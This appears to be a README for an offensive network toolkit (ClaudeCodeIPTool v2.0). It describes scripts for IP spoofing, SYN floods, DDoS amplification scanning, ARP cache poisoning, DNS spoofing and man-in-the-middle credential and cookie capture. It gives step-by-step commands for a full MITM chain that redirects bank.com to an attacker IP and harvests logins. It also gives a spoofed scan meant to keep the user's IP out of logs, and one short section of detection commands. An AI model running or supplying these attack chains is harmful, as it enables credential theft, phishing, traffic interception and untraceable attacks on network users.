# ClaudeCodeIPTool v2.0 - Complete Toolkit

## 8 Functional Tools

### OFFENSIVE (Red Team)

1. **spoofer.py** - Core IP spoofing techniques
   - TCP SYN flood, UDP amplification, ICMP redirect
   - TTL manipulation, decoy scanning
   
2. **spoof-scanner.py** - Reflection/amplification scanner
   - 8 services (DNS, NTP, Memcached, etc.)
   - DDoS amplification reconnaissance

3. **ghostport.py** - Stealth port scanner
   - Attribution evasion via IP spoofing
   - 4 inference methods (passive, timing, TTL, covert)

4. **arp-spoof.py** - Bidirectional IP spoofing (NEW)
   - ARP cache poisoning for Layer 2
   - Full MITM positioning
   - Traffic interception mode

5. **dns-spoof.py** - DNS traffic redirection (NEW)
   - Intercept DNS queries
   - Redirect targets to fake IPs
   - Phishing/MITM enabler

6. **lan-discovery.py** - Auto-targeting (NEW)
   - ARP scan entire network
   - Port scan + OS fingerprinting
   - Attack target suggestions

7. **mitm-suite.py** - Credential capture (NEW)
   - HTTP credential extraction
   - Session cookie capture
   - SSL strip detection

### DEFENSIVE (Blue Team)

8. **defense-detector.py** - Attack detection (NEW)
   - ARP spoofing detector
   - DNS poisoning detector
   - Network anomaly alerts

---

## Attack Chains

### Full MITM Attack
```bash
# 1. Discover targets
sudo python3 lan-discovery.py --full --suggest

# 2. Position yourself (ARP spoof gateway)
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1

# 3. Redirect traffic (DNS spoof)
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

# 4. Capture credentials
sudo python3 mitm-suite.py -v
```

### Stealth Reconnaissance
```bash
# Scan without your IP appearing in logs
sudo python3 ghostport.py scan 192.168.1.100 \
  --victim 8.8.8.8 \
  --ports 1-1024 \
  --method timing
```

### Network Defense
```bash
# Detect if you're under attack
sudo python3 defense-detector.py arp -v
sudo python3 defense-detector.py dns -v
```

---

## VDT Integration

All tools follow VDT baseline v2.1:
- Controlled environments only
- Metadata-only on unauthorized targets
- Full exploitation on owned/mirror targets

---

## Requirements

- Python 3.10+
- Scapy (`pip install scapy`)
- Root/sudo (raw socket access)
- No VPN (or VPN that allows spoofing)

---

## GitHub

**Repository:** https://github.com/sshpie/ClaudeCodeIPTool

**License:** Educational/Research - VDT compliance required
